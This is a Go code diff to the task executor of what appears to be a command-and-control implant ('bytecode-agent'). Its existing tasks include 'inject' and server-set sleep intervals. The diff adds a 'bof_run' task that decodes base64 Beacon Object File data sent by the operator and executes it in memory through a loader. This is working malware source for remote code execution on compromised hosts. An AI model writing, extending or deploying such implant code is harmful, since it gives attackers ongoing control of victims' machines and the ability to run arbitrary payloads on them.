@@ -1,6 +1,7 @@
 package executor
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"os"
@@ -11,6 +12,7 @@ import (
 
 	"bytecode-agent/internal/comms"
 	"bytecode-agent/internal/identity"
+	"bytecode-agent/internal/loader"
 )
 
 // MaxOutputSize limits the output size sent back to the server
@@ -87,6 +89,8 @@ func Execute(task *comms.TaskPayload, apiKey string) *comms.ResultRequest {
 		output = "sleep interval updated"
 	case "inject":
 		output, err = handleInjection(task.Payload)
+	case "bof_run":
+		output, err = handleBOFRun(task.Payload)
 	default:
 		err = fmt.Errorf("unknown task type: %s", task.Type)
 	}
@@ -222,4 +226,29 @@ func toMap(v interface{}) (map[string]interface{}, bool) {
 		}
 	}
 	return nil, false
+}
+
+// handleBOFRun handles Beacon Object File execution
+func handleBOFRun(payload interface{}) (string, error) {
+	payloadMap, ok := toMap(payload)
+	if !ok {
+		return "", fmt.Errorf("invalid payload: expected object")
+	}
+
+	b64Data, ok := payloadMap["bof_data"].(string)
+	if !ok {
+		return "", fmt.Errorf("missing bof_data in payload")
+	}
+
+	entryName, _ := payloadMap["entry"].(string)
+	if entryName == "" {
+		entryName = "go" // Default BOF entry point
+	}
+
+	data, err := base64.StdEncoding.DecodeString(b64Data)
+	if err != nil {
+		return "", fmt.Errorf("failed to decode BOF data: %v", err)
+	}
+
+	return loader.RunBOF(data, entryName)
 }
